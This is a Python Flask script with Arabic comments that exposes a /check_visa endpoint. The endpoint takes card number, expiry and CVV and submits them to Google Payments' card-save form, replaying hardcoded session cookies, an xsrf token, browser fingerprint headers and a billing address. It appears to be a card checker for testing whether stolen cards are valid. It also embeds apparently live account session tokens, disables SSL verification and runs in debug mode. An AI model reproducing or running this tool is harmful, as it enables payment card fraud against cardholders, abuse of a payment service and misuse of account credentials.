from flask import Flask, request, jsonify
import requests
import urllib3

# تعطيل تحذارات SSL غير الضرورية
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route('/check_visa', methods=['GET'])
def check_visa():
    # استقبال بيانات الفيزا من query parameters
    visa_data = request.args.get('visa')
    
    if not visa_data:
        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    try:
        # تقسيم بيانات الفيزا إلى مكوناتها
        card_number, month, year, cvv = visa_data.split('|')
    except ValueError:
        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    # تعريف الكوكيز المحدثة
    cookies = {
        'OTZ': '8178671_44_48_171240_44_319500',
        'AEC': 'AVh_V2hTIC9-mVszEOINI8u2nOJmGZ3LCjUDyCXNRSfyBh4uoAJZdNSpGJY',
        '__Secure-ENID': '28.SE=gCYShULI3i76tnAL80tFuKIUUi8xWEDSAbi46FkRdpxYqEBygLQCLLw6gKoVrKHVQTwTm_zF8BxwrcjxUzVAnVbfSEOLc5PnrbI9PFDL3LxkIwgNcVyI7WoH_xvrhXWCHh5LPA6aJJFX0_Iv4QDxVtbmeARl6CX5imbIGtt1CChyDRfqvZH95o3rNGYYt0hpzdlv5bPy',
        'NID': '525=WhixlLLiPF4sQaOTCEBgZ_TUpMngcUHZ3rnCNFkuh1ef0jw7k3SMRexwrS4MpMsKB5QCcJEK50pKd-kHolNDyOfcpSscJ1zO-WYmWzx7f_o_1C-0nFViak3kULa9Mq49P4acmoiEim3epVl90LDi8R5AOrh9luMVaGJ0mGXcGO2YO-0lrOMTFftYL9cGaiiXQ952HcBCbMyx9eSEULjFPPUxAjCsALi2hpS3u9LsJP55no8dYQsN91sW0KrT8CBB-K79yDOa8msy9jRRuSkvBmjXiE3byB2ontP2U6MUUSZFAzg4UKcq1pXzx45sZRbIKobZ-XqtPjZ-4lmS5MYkGn4d_cekFq12ryc3vlJDdgJOdByAmucqRxYb9vlbTmvkUGcQJHrsP_nWgmOAR43Lzjg5YGnncqPb2y8idTEPQwDUImPRripe9BOZNa0U1BP0RYZIvkh96JO8uLfMlkz72M_TRNZ7nIYLVx3rBy5qxkYD2ax6BuakEupEEBdIN0xDV1oA8v0R-PIpTWYc26f0pA3lc8NNRxnuSXjgRkZBCP_b2a-GaiKmZSDQg7GdywL6nXctbYftMd5U6KPnkwli2Khrv9HNTozziGwpUnvrGshhO35Gl_v1Ipyc2_BSfMrBEwN-kQ2_GpbZkYSDPgNAuIkCkUs0eHgwFTQtMFSdnqUcM9Gl_1DUJLI4EZClN9quI6z6NVLhRrblqt7eG4WXm5wXYNy-lnvroOU8IKP14z9iNn2se5hxjZPxQmZH10mp5ENH7dUoy2Q6k2HClRcAL_FpehRGgWMtEEfmd7U4phE-MHUG6GzZeMdxdhaGDLRQlzBNhRL733dJa2XAse5qgF3xun5KWcmzCJymPNYGP2Lq-gl_Px5u1_JQIXVL_SKNkvx8bq_hRuLs-4LfiGgmtVt4c4qZWHqzo3Pb8S3kHag2YJtgYpRUOKPYjfS5gpbEm-v1RosWREU8gLdKZTi2D7PU5iYz0T478fMJ47vMO98_T8RAsD04YROwyFZIG56afUNvIR_TwUtQhkBxzarUYcshleUerspv_KKNCBK4hv_qecqcavyd8Hb-_cvrOF0fMclaqXbBJj5iq4vvL6IH4NXHsoEjnJ2bxuC_ajutynE2-IKd6Ai0wE7TJhkm-TdVECfDFhY4vKw',
        'SID': 'g.a000zgiGj-VEhZ8ybH-W-Cfo7W9QEcj8RK1_V-m2gC9REBblsiX4dsFpKagt42vdEtiG0Rkd1AACgYKAVASARYSFQHGX2Mipbmxi9bNbppaZy2Pfq6aMBoVAUF8yKqLAWE6-vkJiI2ejCrLjkbo0076',
        '__Secure-1PSID': 'g.a000zgiGj-VEhZ8ybH-W-Cfo7W9QEcj8RK1_V-m2gC9REBblsiX4zH0WTJSsL71WBV7ipkADDQACgYKAf4SARYSFQHGX2Mi00fGGW5SxgrNAC95PAA-dRoVAUF8yKoNvMtLZyTcTYyGT2F0Vuud0076',
        '__Secure-3PSID': 'g.a000zgiGj-VEhZ8ybH-W-Cfo7W9QEcj8RK1_V-m2gC9REBblsiX4CicnSlMhIXIGMLZfMOwOHQACgYKAUQSARYSFQHGX2Mi7ZXAjEvjzh9AwOmEV8etyRoVAUF8yKrDw9q1sflAPz6Zg3CLYKMb0076',
        'HSID': 'ArkV-KZgfrSX_MvCw',
        'SSID': 'AzLABZTeM1MDg1p_M',
        'APISID': 'bfK2QIJ55eFFxL7v/A-IQvLw-Ptt9pkvk_',
        'SAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
        '__Secure-1PAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
        '__Secure-3PAPISID': 'Bf_-v6LERe4OwjIh/AGR1n7o8YXV0arAwF',
        '__utma': '207539602.2100594883.1742201890.1753803374.1753806231.14',
        '__utmc': '207539602',
        '__utmz': '207539602.1753806231.14.14.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '__utmt': '1',
        'S': 'billing-ui-v3=F1levuIu8n_WbEhTPcmgyBKSxUsg8qld:billing-ui-v3-efe=F1levuIu8n_WbEhTPcmgyBKSxUsg8qld',
        '__utmb': '207539602.6.9.1753806264903',
        'SIDCC': 'AKEyXzW7z_kNKZIcFomX5GHctZ7_kBYXSv42OXvV9SM9u4G5oB6dEtesHZopqFd6dzGRAo2bRg',
        '__Secure-1PSIDCC': 'AKEyXzXdGXFVkt1xTyzStzgREnMKWbE49TT5yyBxTfDwXZVDfuw2Ppopaj0JxsKMPCOACPl6Tpw',
        '__Secure-3PSIDCC': 'AKEyXzWmZYsmaTx1FQKX4BKyJFfZ40xJyTBWyy1BD87u2n5KLD4BXUDNWWRM5b_wC7wvUXFPI4Q',
    }

    # تعريف الهيدرات المحدثة
    headers = {
        'authority': 'payments.google.com',
        'accept': '*/*',
        'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://payments.google.com',
        'referer': 'https://payments.google.com/payments/u/0/embedded/instrument_manager?tc=96%2C87&wst=1753806222984&cst=1753806227782&si=6534376669104887&pet&sri=2&hmi=false&ipi=3yzlibfzljbl&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_424w9ti8peed0&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByDD7%2FOOvw8g9acEYgDAAgD4AwE%3D&spul=502&cori=https%3A%2F%2Fwallet.google.com',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"137.0.7337.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"SM-A307FN"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-client-data': 'CIOJywE=',
        'x-requested-with': 'XmlHttpRequest',
    }

    # تعريف البارامترات المحدثة
    params = {
        'ait': 'GAIA',
        'cn': '$p_424w9ti8peed0',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': '3yzlibfzljbl',
        'hl': 'ar',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': '6534376669104887',
        'style': ':m2',
        'cst': '1753806227782',
        'wst': '1753806222984',
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
        's': '5',
    }

    # تعريف بيانات الطلب المحدثة
    data = {
        'xsrf': 'AJWlU2MTRmXmM7bwi6aKFx-tMCAVhtSGoQ:1753806229765',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
        'msg': '[[null,"ACo329yKv8zlA//gTwZoZ8SYH8lB1NY29WZoo4K5m2AOETrI99a7TRguLWggb067eoN2UTEqu1Ezz9R7dV3rO6PoPeOKGQPFr5L6FwjRop+0Cslt6M3cyZb8akvjvQPSyKKycZ/1j6oqiXdlUUSp7kMLDRu7yLgCTr3vf8AnXGvIqMAnfaVo+Fu/qnnLkQlgnW/SCdK/T7IrgoeHTgjQu5h9ZCPaBTaQSQEj5jF9QgVo+ZGpvZ/XtiEMl5pxO9A59GnaYPKorck8",null,[null,[null,null,null,["!4-Cl4LjNAAZAdzQfYHdCaPy-MJKk6bc7ADQBEArZ1P4IokwYBuN4-t6kcZFGgu0KjDT3bPOkwGSuRj293wthUWE3U3M8kk9BF5shkQ7ZAgAABuZSAAAARGgBB34ATNBIljJw3i7BEfnMrH35ZVeKt5bKW0vznOAxyK505v2q9fPaKlwDfS635-6OUADgaQQaEaubSfZiqPQg4Ne0t0U2FyOvtioglbE3zdmZB7MIuCHsyjdajvbvh647Q-dOUCNJyoQnJOdpOj7TMV3RlbqgTnKA00kmFMiOq6x-lPb8fyc1WSX-PWLNMYkXncBGG6a7zK7Vah53w8Qp0YEJ7KSrMHUp0egZ7zaTkHtoufM9A9wNmUPw97_VCpSVIuNpzhpOkPj1ycOntX15lprLSMrZ601QJj7-vO96nZ3npU-iILt2SAQmazraY_bgQveXi-net7IkFq5rdE-lxBpp7SyA1X2EH-pUtHO_tVBYjb32WXPIPik_1S0lDANCnI5HOc1V8ib4yMWACj3_7426Wp9g_qXRXfcLphqZNZxrur0pZ5HR4k0BYw0jDB2BuhyfU-LeRq3x_wOcuKtUB0KuY02-MDgpRXvPU_b72RpJAZav3pOZrg2PAbNPuXAo9P4Tt1mmUoK7YxsUJSte7n12v3Tq7QEqWc2BDJrXd4OCOFEyLS6WNqVn3XIJkERTo_eMI-gpG-p-bCF1ttKIUaLdoAOmqJC0E4spAVk_1xov52h_upOdxJ-2qNS8N5gO5PKH_ngXrL0Fo-yOmgu5azkGs17ZFx38k-644NLTz8b1o5cDwu50kMf8sEKG7fJdbIdkxw_yXpS8HFOoelX_Nr0YeYCymMNY4KsLHmhMqYBmnnnDEb_ZEt28-RihrH0sCwAb0NV9Tkr4EztAC8pAB6EE8uP2PqBue4fOJzahMXI_w62XzQ44dzFiLpZryUlrgbbYWMS_vKj_HIDDr2AeAkErLhES_LIpTz21gDOuwve5ppgDHnyavGwKz038Gq2dAdMoBBmTfLZjbiQtCMtCkvUKK-NoZ4yvggtowo29Qv47ZPqxrLxKGR3EY6uUiP7Og4XvZdkLgJXfEK6Kma09ieID2nhX7S3Z6KkcmlifI3QZhdm4EqAWk37x2CmeRZ6OK-JNYXGac4-xp-PwwJiqZse3m9hKLRvjTavvQfg2Oad2e0eOhXhoizlfxdDRL25RH2KwCw0s-CZ7y9WMl79caqhT6j0H17lrxxnp0QPFBP5Eknae7z2zUxC6bzTkUP1HC-qteA1J3ncq_hj2gZPMiB1M0WRw6V--O5sVVCXWmatj5UQALJmmn8-wjdWeuR2TXkwBv85JE21YHQNVDzPoPPQX2q8BUAnw2hwm21K3EEoL6bNx6Uuza36-V5YMxJzI2rvZiqk6HoZYVf1Rfn73JEJ-VJVFUx4_vWnXjUr7ZFx9GGSUvWQcQxKgTGZV_lin3ZtF_R10U7jqrKFf2Fl32klrVA6TVXQZ1DJsdshc5BBrh0_sJppQBdRSmyAswTkQu92iJy8qPXXF493yf-is7A4AUaXHjPojyRrk4pvj9cS10g62MXxGDKXXlQfn4qK8t3ZZz11oOwVJk5_F9ZgmyzSn0XNyAZCB4sHu8qtFYDhABZLI4Ff8uI2WG19ZsVGBcFEbfS1N6Kiy0OCqtHhyF8ONwJ1WFUDbdD6zwd2pQDTO2Ae5TBFKzTOOA0DDcj2Pd0Q2H5-pLxgC3Y81Qf7nXXNVWuXxtNcJHdMqSKhTKaPZTWdQ4TmljlsbBH49Zz8uzGQnO4mWy008hJg164lOguQY9_rfZRzqOiXzRr4nbQOSS6h79ttjzNNM5UMxqCswrsfahW4JRTLrPQzq4dZI9hAoCK83d_OPD0DSfG2A5L-oSAfc0yjW6_ufi-RkvaWlgnVYIqmw1hUC7p8Yz0wkijBWQAXekBzW0dHBOmgZb8JNXHFJn1UTgmr19I9JZvaq0vp_AhxVoLX7bUlJ_NUngb59c4ngSc8x_QUHgpuLnZ5FfTFKW_FcwbQug2-4q_gk9odyeCIpulD96cfh1RW-_GAzY4FPXv30k8zLqjJilOPe6TQVXqbTzU2RZ1RBqtfaFp6h9Xr0W4VzMOEvfM0X34ai0C8MtBIfVklRJYVPMY5bNmGk-WHzZOXp3hoi7MKOKf-P5PtzIn7rVe2PD_nIKO_KmDaeNQRHMkNH0yjvK4cuyMUT9UmuV6ruVWPmrTwHbsmODT_cpcPnJo3I79M5jB4trABMVpfi_FubED-2Rv4dqCmWdyY-oWodIEupS4m5mOmH1cKFkcIsJUNVDN6tztw_ohD6RLafBeQC0K5-9cnX4hRi0-NTo2gzrp3cnkWCG9fGA1dBVvxDRPJarhZcb43uB7nI7WZNl4x1vyp8-kv2ZQndRkUMUIHveJ6rdJuFoQVA_BFAVEUxuw7p3lgIZKW8yFm8Leh_vBaJ6-wd3j88YM6Mku6_McDlQGgOfTMXlvJvzFU0QePahhCZJaAB2UNv5qiuqYXo-AURWjVhD5Vu3nP1ICDLwRsJSz4aLtzMru5B29wjVqQTA_M1RRTs1hr3ZNRTdavtqbs2mHV9Vw5ZhplaSMtF-iFRC3L9GtRNEZaX6mY6ItN5mVCjM-CoLnlRgE2eTF_vBZ97YqzyzD51irLlDmJ6YOJV8R-NPzI8l-qv225yUjAKxYAW73nOyTa8dbquLyKrTWqEqAJgRE6ECZOUBk5nQE2Bq8-Z5-R_WT_A7CIKZMXiEL-7a0wrPlSc-aVZD4Cvbrgqf9mkPxEwhraFrxCk94FiKPFFOcWsq-RVmnWOGRIC9kmhOJmQAIyxKcgOMjuJvCXmHjnHNtJERLRT30Y"]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",11,2029,null,"1703",null,"__s7e_data__61bb463a","هونجا البونجا",[["US",null,"NY",null,"New York",null,null,null,null,null,null,"10001",null,["Candice Hill Angela Robinson","836393"]],null,null,null,"billingAddress",null,null,2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,1,236,1aa4331,0,"Linux armv81,f54683f2,0,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,1,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,1,7:a21,3,19856ff50ef,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2e4:a40,"f,19856ff53d4,"n,0,0,"t,19856ff49c8,0,0,0,0,19856ff49d8,19856ff49d8,19856ff49d8,19856ff49d8,19856ff49d8,0,19856ff49f0,19856ff4e28,19856ff4fb1,19856ff4e4c,19856ff511d,19856ff511e,19856ff5433,19856ff5815,19856ff5818,19856ff5868:a10:a31,3,"h,1,"p,81,3a,"m,57f,16f1,303,1257,1b66,18e9,33e1'
    }

    try:
        # إضافة جلسة مع إعدادات أفضل للاتصال
        session = requests.Session()
        session.verify = False  # تعطيل التحقق من SSL (لأغراض الاختبار فقط)
        session.headers.update(headers)
        
        # إرسال الطلب مع إعدادات متقدمة
        response = session.post(
            'https://payments.google.com/efe/payments/u/0/instrument_manager_save_page',
            params=params,
            cookies=cookies,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        # إرجاع الاستجابة كـ JSON
        return jsonify({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'content': response.text
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'error': str(e),
            'message': 'فشل في الاتصال بخادم جوجل. يرجى التحقق من اتصال الإنترنت أو تحديث الكوكيز والهيدرات.'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
